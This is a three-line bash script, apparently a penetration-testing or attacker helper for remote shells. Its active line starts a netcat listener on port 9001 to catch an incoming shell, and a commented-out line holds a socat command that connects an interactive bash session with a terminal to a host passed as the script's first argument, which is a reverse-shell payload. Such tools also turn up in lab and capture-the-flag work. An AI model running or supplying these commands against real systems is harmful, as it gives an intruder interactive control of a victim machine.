#!/bin/bash
#socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$1
netcat -lvnp 9001
